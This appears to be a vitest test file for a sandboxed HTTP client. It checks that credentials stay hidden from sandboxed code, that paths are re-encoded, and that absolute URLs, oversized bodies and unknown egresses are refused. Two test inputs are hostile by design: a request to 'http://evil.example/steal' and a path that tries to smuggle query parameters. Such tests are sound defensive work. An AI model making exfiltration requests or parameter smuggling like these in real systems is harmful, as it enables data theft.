/**
 * The injected HTTP client, exercised through the Operation Host against a local `node:http` fixture
 * (ADR-0025). What matters here: the credential is attached on the way out and cannot be read from
 * inside the sandbox; the path is joined and re-encoded so a `&` cannot steer the request; the query
 * is built from an object; an HTTP status is a value, never a throw; and the two things that *are*
 * refused — an absolute URL, a body over the cap, an unknown egress — say so by name.
 */

import http from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { OperationHost } from "../../src/operations/dynamic/host.js";
import type { DynamicOperationConfig } from "../../src/config.js";
import type { OperationContext, OperationOutcome } from "../../src/operations/registry.js";

interface Seen {
    method?: string;
    url?: string;
    auth?: string;
}

let server: http.Server;
let port: number;
let seen: Seen;
let bodyBytes = 32;

beforeAll(async () => {
    server = http.createServer((req, res) => {
        seen = { method: req.method, url: req.url, auth: req.headers["authorization"] };
        const path = (req.url ?? "").split("?")[0];
        if (path === "/missing") {
            res.writeHead(404, { "content-type": "application/json" });
            res.end(JSON.stringify({ message: "not found" }));
            return;
        }
        if (path === "/big") {
            res.writeHead(200, { "content-type": "text/plain" });
            res.end("x".repeat(bodyBytes));
            return;
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ ok: true, saw: req.url }));
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    port = (server.address() as AddressInfo).port;
});

afterAll(async () => {
    await new Promise<void>((resolve) => server.close(() => resolve()));
});

function config(overrides: Partial<DynamicOperationConfig> = {}): DynamicOperationConfig {
    return {
        timeoutMs: 20_000,
        maxBodyBytes: 4 * 1024 * 1024,
        memoryMb: 128,
        cacheTtlMs: 300_000,
        egresses: { books: { url: `http://127.0.0.1:${port}`, token: "s3cret-token" } },
        ...overrides,
    };
}

const context = { idempotencyKey: "conv:1" } as unknown as OperationContext;

async function run(
    host: OperationHost,
    source: string,
    options: { egress?: string } = {},
): Promise<OperationOutcome | undefined> {
    const module = host.compile(source);
    return host.run(module, "execute", {}, context, {
        key: "books.op",
        egress: options.egress ?? "books",
    });
}

describe("the credential", () => {
    it("is attached on the way out and unreadable from inside the sandbox", async () => {
        const host = new OperationHost(config());
        const outcome = await run(
            host,
            "async function execute() { await host.http.request({ path: '/ping' }); return JSON.stringify(host.http); }",
        );
        expect(seen.auth).toBe("Bearer s3cret-token");
        // The client exposes only `request` — the token is nowhere on the object the sandbox holds.
        expect(outcome).toEqual({ kind: "value", value: "{}" });
    });
});

describe("the request", () => {
    it("joins and re-encodes the path so a & cannot steer it", async () => {
        const host = new OperationHost(config());
        await run(host, "async function execute() { return await host.http.request({ path: '/accounts/a&b=c' }); }");
        expect(seen.url).toBe("/accounts/a%26b%3Dc");
    });

    it("builds the query from an object", async () => {
        const host = new OperationHost(config());
        await run(
            host,
            "async function execute() { return await host.http.request({ path: '/accounts', query: { limit: 200, type: 'asset' } }); }",
        );
        expect(seen.url).toBe("/accounts?limit=200&type=asset");
    });

    it("answers a 404 as a value and does not throw", async () => {
        const host = new OperationHost(config());
        const outcome = await run(host, "async function execute() { return await host.http.request({ path: '/missing' }); }");
        expect(outcome).toEqual({
            kind: "value",
            value: { status: 404, ok: false, body: { message: "not found" } },
        });
    });
});

describe("what is refused", () => {
    it("refuses an absolute URL", async () => {
        const host = new OperationHost(config());
        const outcome = await run(
            host,
            "async function execute() { return await host.http.request({ path: 'http://evil.example/steal' }); }",
        );
        expect(outcome?.kind).toBe("error");
        expect((outcome as { message: string }).message).toContain("absolute");
    });

    it("refuses a body over the cap", async () => {
        bodyBytes = 5000;
        const host = new OperationHost(config({ maxBodyBytes: 1000 }));
        const outcome = await run(host, "async function execute() { return await host.http.request({ path: '/big' }); }");
        expect(outcome?.kind).toBe("error");
        expect((outcome as { message: string }).message).toContain("cap");
        bodyBytes = 32;
    });

    it("refuses an unknown egress, naming it", async () => {
        const host = new OperationHost(config());
        const outcome = await run(
            host,
            "async function execute() { return await host.http.request({ path: '/ping' }); }",
            { egress: "nowhere" },
        );
        expect(outcome?.kind).toBe("error");
        expect((outcome as { message: string }).message).toContain("nowhere");
    });
});
